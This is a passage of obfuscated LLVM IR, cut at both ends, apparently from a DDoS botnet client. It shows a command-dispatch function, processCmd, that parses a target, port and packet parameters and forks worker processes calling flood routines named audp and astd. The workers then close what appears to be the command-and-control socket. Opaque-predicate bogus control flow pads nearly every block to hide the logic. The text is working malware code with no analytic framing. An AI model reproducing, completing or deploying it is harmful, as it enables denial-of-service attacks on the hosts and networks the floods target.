  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2, %4
  %43 = load i32, i32* @x.51
  %44 = load i32, i32* @y.52
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = load i8*, i8** %1, align 8
  %52 = load i32, i32* @x.51
  %53 = load i32, i32* @y.52
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i8* %51

originalBBalteredBB:                              ; preds = %originalBB, %8
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.29, i32 0, i32 0), i8** %1, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i32 0, i32 0), i8** %1, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %60 = load i8*, i8** %1, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = load i32, i32* @x.53
  %4 = load i32, i32* @y.54
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %46 = load i8**, i8*** %12, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 0
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %50 = icmp ne i32 %49, 0
  %51 = load i32, i32* @x.53
  %52 = load i32, i32* @y.54
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %50, label %304, label %59

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i32, i32* @x.53
  %61 = load i32, i32* @y.54
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  %68 = load i32, i32* %11, align 4
  %69 = icmp slt i32 %68, 6
  %70 = load i32, i32* @x.53
  %71 = load i32, i32* @y.54
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %69, label %139, label %78

; <label>:78:                                     ; preds = %originalBBpart24
  %79 = load i8**, i8*** %12, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 3
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @atoi(i8* %81) #10
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %139, label %84

; <label>:84:                                     ; preds = %78
  %85 = load i8**, i8*** %12, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 2
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @atoi(i8* %87) #10
  %89 = icmp eq i32 %88, -1
  br i1 %89, label %139, label %90

; <label>:90:                                     ; preds = %84
  %91 = load i8**, i8*** %12, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 4
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @atoi(i8* %93) #10
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %139, label %96

; <label>:96:                                     ; preds = %90
  %97 = load i8**, i8*** %12, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 5
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @atoi(i8* %99) #10
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %139, label %102

; <label>:102:                                    ; preds = %96
  %103 = load i8**, i8*** %12, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 5
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105) #10
  %107 = icmp sgt i32 %106, 65500
  br i1 %107, label %139, label %108

; <label>:108:                                    ; preds = %102
  %109 = load i8**, i8*** %12, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 4
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 @atoi(i8* %111) #10
  %113 = icmp sgt i32 %112, 32
  br i1 %113, label %139, label %114

; <label>:114:                                    ; preds = %108
  %115 = load i32, i32* %11, align 4
  %116 = icmp eq i32 %115, 7
  br i1 %116, label %117, label %140

; <label>:117:                                    ; preds = %114
  %118 = load i32, i32* @x.53
  %119 = load i32, i32* @y.54
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %117
  %126 = load i8**, i8*** %12, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 6
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  %130 = icmp slt i32 %129, 1
  %131 = load i32, i32* @x.53
  %132 = load i32, i32* @y.54
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %130, label %139, label %140

; <label>:139:                                    ; preds = %originalBBpart28, %108, %102, %96, %90, %84, %78, %originalBBpart24
  br label %1421

; <label>:140:                                    ; preds = %originalBBpart28, %114
  %141 = load i8**, i8*** %12, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 1
  %143 = load i8*, i8** %142, align 8
  store i8* %143, i8** %13, align 8
  %144 = load i8**, i8*** %12, align 8
  %145 = getelementptr inbounds i8*, i8** %144, i64 2
  %146 = load i8*, i8** %145, align 8
  %147 = call i32 @atoi(i8* %146) #10
  store i32 %147, i32* %14, align 4
  %148 = load i8**, i8*** %12, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 3
  %150 = load i8*, i8** %149, align 8
  %151 = call i32 @atoi(i8* %150) #10
  store i32 %151, i32* %15, align 4
  %152 = load i8**, i8*** %12, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 4
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @atoi(i8* %154) #10
  store i32 %155, i32* %16, align 4
  %156 = load i8**, i8*** %12, align 8
  %157 = getelementptr inbounds i8*, i8** %156, i64 5
  %158 = load i8*, i8** %157, align 8
  %159 = call i32 @atoi(i8* %158) #10
  store i32 %159, i32* %17, align 4
  %160 = load i32, i32* %11, align 4
  %161 = icmp eq i32 %160, 7
  br i1 %161, label %162, label %183

; <label>:162:                                    ; preds = %140
  %163 = load i32, i32* @x.53
  %164 = load i32, i32* @y.54
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %162
  %171 = load i8**, i8*** %12, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 6
  %173 = load i8*, i8** %172, align 8
  %174 = call i32 @atoi(i8* %173) #10
  %175 = load i32, i32* @x.53
  %176 = load i32, i32* @y.54
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %200

; <label>:183:                                    ; preds = %140
  %184 = load i32, i32* @x.53
  %185 = load i32, i32* @y.54
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %183
  %192 = load i32, i32* @x.53
  %193 = load i32, i32* @y.54
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %200

; <label>:200:                                    ; preds = %originalBBpart216, %originalBBpart212
  %201 = phi i32 [ %174, %originalBBpart212 ], [ 10, %originalBBpart216 ]
  %202 = load i32, i32* @x.53
  %203 = load i32, i32* @y.54
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %200
  store i32 %201, i32* %18, align 4
  %210 = load i8*, i8** %13, align 8
  %211 = call i8* @strstr(i8* %210, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %212 = icmp ne i8* %211, null
  %213 = load i32, i32* @x.53
  %214 = load i32, i32* @y.54
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %212, label %221, label %274

; <label>:221:                                    ; preds = %originalBBpart220
  %222 = load i32, i32* @x.53
  %223 = load i32, i32* @y.54
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %221
  %230 = load i8*, i8** %13, align 8
  %231 = call i8* @strtok(i8* %230, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %231, i8** %19, align 8
  %232 = load i32, i32* @x.53
  %233 = load i32, i32* @y.54
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %240

; <label>:240:                                    ; preds = %271, %originalBBpart224
  %241 = load i8*, i8** %19, align 8
  %242 = icmp ne i8* %241, null
  br i1 %242, label %243, label %273

; <label>:243:                                    ; preds = %240
  %244 = call i32 @listFork()
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %271, label %246

; <label>:246:                                    ; preds = %243
  %247 = load i32, i32* @x.53
  %248 = load i32, i32* @y.54
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %246
  %255 = load i8*, i8** %19, align 8
  %256 = load i32, i32* %14, align 4
  %257 = load i32, i32* %15, align 4
  %258 = load i32, i32* %16, align 4
  %259 = load i32, i32* %17, align 4
  %260 = load i32, i32* %18, align 4
  call void @audp(i8* %255, i32 %256, i32 %257, i32 %258, i32 %259, i32 %260)
  %261 = load i32, i32* @mainCommSock, align 4
  %262 = call i32 @close(i32 %261)
  call void @_exit(i32 0) #11
  %263 = load i32, i32* @x.53
  %264 = load i32, i32* @y.54
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  unreachable

; <label>:271:                                    ; preds = %243
  %272 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %272, i8** %19, align 8
  br label %240

; <label>:273:                                    ; preds = %240
  br label %303

; <label>:274:                                    ; preds = %originalBBpart220
  %275 = call i32 @listFork()
  %276 = icmp ne i32 %275, 0
  br i1 %276, label %277, label %278

; <label>:277:                                    ; preds = %274
  br label %1421

; <label>:278:                                    ; preds = %274
  %279 = load i32, i32* @x.53
  %280 = load i32, i32* @y.54
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %278
  %287 = load i8*, i8** %13, align 8
  %288 = load i32, i32* %14, align 4
  %289 = load i32, i32* %15, align 4
  %290 = load i32, i32* %16, align 4
  %291 = load i32, i32* %17, align 4
  %292 = load i32, i32* %18, align 4
  call void @audp(i8* %287, i32 %288, i32 %289, i32 %290, i32 %291, i32 %292)
  %293 = load i32, i32* @mainCommSock, align 4
  %294 = call i32 @close(i32 %293)
  call void @_exit(i32 0) #11
  %295 = load i32, i32* @x.53
  %296 = load i32, i32* @y.54
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  unreachable

; <label>:303:                                    ; preds = %273
  br label %304

; <label>:304:                                    ; preds = %303, %originalBBpart2
  %305 = load i8**, i8*** %12, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 0
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @strcmp(i8* %307, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.32, i32 0, i32 0)) #10
  %309 = icmp ne i32 %308, 0
  br i1 %309, label %446, label %310

; <label>:310:                                    ; preds = %304
  %311 = load i32, i32* %11, align 4
  %312 = icmp slt i32 %311, 4
  br i1 %312, label %325, label %313

; <label>:313:                                    ; preds = %310
  %314 = load i8**, i8*** %12, align 8
  %315 = getelementptr inbounds i8*, i8** %314, i64 2
  %316 = load i8*, i8** %315, align 8
  %317 = call i32 @atoi(i8* %316) #10
  %318 = icmp slt i32 %317, 1
  br i1 %318, label %325, label %319

; <label>:319:                                    ; preds = %313
  %320 = load i8**, i8*** %12, align 8
  %321 = getelementptr inbounds i8*, i8** %320, i64 3
  %322 = load i8*, i8** %321, align 8
  %323 = call i32 @atoi(i8* %322) #10
  %324 = icmp slt i32 %323, 1
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %319, %313, %310
  br label %1421

; <label>:326:                                    ; preds = %319
  %327 = load i8**, i8*** %12, align 8
  %328 = getelementptr inbounds i8*, i8** %327, i64 1
  %329 = load i8*, i8** %328, align 8
  store i8* %329, i8** %20, align 8
  %330 = load i8**, i8*** %12, align 8
  %331 = getelementptr inbounds i8*, i8** %330, i64 2
  %332 = load i8*, i8** %331, align 8
  %333 = call i32 @atoi(i8* %332) #10
  store i32 %333, i32* %21, align 4
  %334 = load i8**, i8*** %12, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 3
  %336 = load i8*, i8** %335, align 8
  %337 = call i32 @atoi(i8* %336) #10
  store i32 %337, i32* %22, align 4
  %338 = load i8*, i8** %20, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %340 = icmp ne i8* %339, null
  br i1 %340, label %341, label %421

; <label>:341:                                    ; preds = %326
  %342 = load i32, i32* @x.53
  %343 = load i32, i32* @y.54
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %341
  %350 = load i8*, i8** %20, align 8
  %351 = call i8* @strtok(i8* %350, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %351, i8** %23, align 8
  %352 = load i32, i32* @x.53
  %353 = load i32, i32* @y.54
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %360

; <label>:360:                                    ; preds = %originalBBpart244, %originalBBpart236
  %361 = load i32, i32* @x.53
  %362 = load i32, i32* @y.54
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %360
  %369 = load i8*, i8** %23, align 8
  %370 = icmp ne i8* %369, null
  %371 = load i32, i32* @x.53
  %372 = load i32, i32* @y.54
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %370, label %379, label %404

; <label>:379:                                    ; preds = %originalBBpart240
  %380 = call i32 @listFork()
  %381 = icmp ne i32 %380, 0
  br i1 %381, label %386, label %382

; <label>:382:                                    ; preds = %379
  %383 = load i8*, i8** %23, align 8
  %384 = load i32, i32* %21, align 4
  %385 = load i32, i32* %22, align 4
  call void @astd(i8* %383, i32 %384, i32 %385)
  call void @_exit(i32 0) #11
  unreachable

; <label>:386:                                    ; preds = %379
  %387 = load i32, i32* @x.53
  %388 = load i32, i32* @y.54
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %386
  %395 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %395, i8** %23, align 8
  %396 = load i32, i32* @x.53
  %397 = load i32, i32* @y.54
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %360

; <label>:404:                                    ; preds = %originalBBpart240
  %405 = load i32, i32* @x.53
  %406 = load i32, i32* @y.54
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %404
  %413 = load i32, i32* @x.53
  %414 = load i32, i32* @y.54
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %445

; <label>:421:                                    ; preds = %326
  %422 = load i32, i32* @x.53
  %423 = load i32, i32* @y.54
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %421
  %430 = call i32 @listFork()
  %431 = icmp ne i32 %430, 0
  %432 = load i32, i32* @x.53
  %433 = load i32, i32* @y.54
  %434 = sub i32 %432, 1
  %435 = mul i32 %432, %434
  %436 = urem i32 %435, 2
  %437 = icmp eq i32 %436, 0
  %438 = icmp slt i32 %433, 10
  %439 = or i1 %437, %438
  br i1 %439, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %431, label %440, label %441

; <label>:440:                                    ; preds = %originalBBpart252
  br label %1421

; <label>:441:                                    ; preds = %originalBBpart252
  %442 = load i8*, i8** %20, align 8
  %443 = load i32, i32* %21, align 4
  %444 = load i32, i32* %22, align 4
  call void @astd(i8* %442, i32 %443, i32 %444)
  call void @_exit(i32 0) #11
  unreachable

; <label>:445:                                    ; preds = %originalBBpart248
  br label %446

; <label>:446:                                    ; preds = %445, %304
  %447 = load i32, i32* @x.53
  %448 = load i32, i32* @y.54
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %446
  %455 = load i8**, i8*** %12, align 8
  %456 = getelementptr inbounds i8*, i8** %455, i64 0
  %457 = load i8*, i8** %456, align 8
  %458 = call i32 @strcmp(i8* %457, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.33, i32 0, i32 0)) #10
  %459 = icmp ne i32 %458, 0
  %460 = load i32, i32* @x.53
  %461 = load i32, i32* @y.54
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %459, label %766, label %468

; <label>:468:                                    ; preds = %originalBBpart256
  %469 = load i32, i32* %11, align 4
  %470 = icmp slt i32 %469, 6
  br i1 %470, label %593, label %471

; <label>:471:                                    ; preds = %468
  %472 = load i32, i32* @x.53
  %473 = load i32, i32* @y.54
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %471
  %480 = load i8**, i8*** %12, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 3
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #10
  %484 = icmp eq i32 %483, -1
  %485 = load i32, i32* @x.53
  %486 = load i32, i32* @y.54
  %487 = sub i32 %485, 1
  %488 = mul i32 %485, %487
  %489 = urem i32 %488, 2
  %490 = icmp eq i32 %489, 0
  %491 = icmp slt i32 %486, 10
  %492 = or i1 %490, %491
  br i1 %492, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %484, label %593, label %493

; <label>:493:                                    ; preds = %originalBBpart260
  %494 = load i8**, i8*** %12, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 2
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  %498 = icmp eq i32 %497, -1
  br i1 %498, label %593, label %499

; <label>:499:                                    ; preds = %493
  %500 = load i32, i32* @x.53
  %501 = load i32, i32* @y.54
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %499
  %508 = load i8**, i8*** %12, align 8
  %509 = getelementptr inbounds i8*, i8** %508, i64 4
  %510 = load i8*, i8** %509, align 8
  %511 = call i32 @atoi(i8* %510) #10
  %512 = icmp eq i32 %511, -1
  %513 = load i32, i32* @x.53
  %514 = load i32, i32* @y.54
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %512, label %593, label %521

; <label>:521:                                    ; preds = %originalBBpart264
  %522 = load i32, i32* @x.53
  %523 = load i32, i32* @y.54
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %521
  %530 = load i8**, i8*** %12, align 8
  %531 = getelementptr inbounds i8*, i8** %530, i64 4
  %532 = load i8*, i8** %531, align 8
  %533 = call i32 @atoi(i8* %532) #10
  %534 = icmp sgt i32 %533, 32
  %535 = load i32, i32* @x.53
  %536 = load i32, i32* @y.54
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %534, label %593, label %543

; <label>:543:                                    ; preds = %originalBBpart268
  %544 = load i32, i32* %11, align 4
  %545 = icmp sgt i32 %544, 6
  br i1 %545, label %546, label %568

; <label>:546:                                    ; preds = %543
  %547 = load i32, i32* @x.53
  %548 = load i32, i32* @y.54
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %546
  %555 = load i8**, i8*** %12, align 8
  %556 = getelementptr inbounds i8*, i8** %555, i64 6
  %557 = load i8*, i8** %556, align 8
  %558 = call i32 @atoi(i8* %557) #10
  %559 = icmp slt i32 %558, 0
  %560 = load i32, i32* @x.53
  %561 = load i32, i32* @y.54
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
